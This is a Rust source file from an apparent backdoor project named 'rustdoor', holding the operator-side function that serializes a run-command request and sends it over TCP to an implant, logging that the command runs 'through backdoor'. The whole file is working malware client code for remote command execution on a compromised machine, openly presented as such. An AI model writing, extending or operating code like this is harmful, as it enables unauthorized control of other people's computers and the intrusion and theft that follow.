use byteorder::{BigEndian, WriteBytesExt};
use rustdoor::communication::messages::{
    MessageType, RunCommandRequest, MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE,
};
use std::io::{Error, Write};
use std::net::TcpStream;

use crate::commanding::get_response;

fn make_run_command_request_buffer(command: String, async_run: bool) -> Vec<u8> {
    let req = RunCommandRequest { command, async_run };
    let serialized_message = ron::ser::to_string(&req).unwrap();

    let message_type = MessageType::RunCommandType as u8;
    let message_len = serialized_message.len();

    let mut buffer: Vec<u8> =
        Vec::with_capacity(message_len + MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE);
    buffer.push(message_type);
    buffer.write_u32::<BigEndian>(message_len as u32).unwrap();
    buffer.extend(serialized_message.into_bytes());
    buffer
}

pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<(), Error> {
    println!("Running command {} through backdoor.", command);
    let msg = make_run_command_request_buffer(command, false);

    println!("Sending buffer {:?}", msg);
    stream.write(&msg).unwrap();
    println!("Sent message, awaiting reply...");

    let response = get_response(&mut stream);

    Ok(())
}
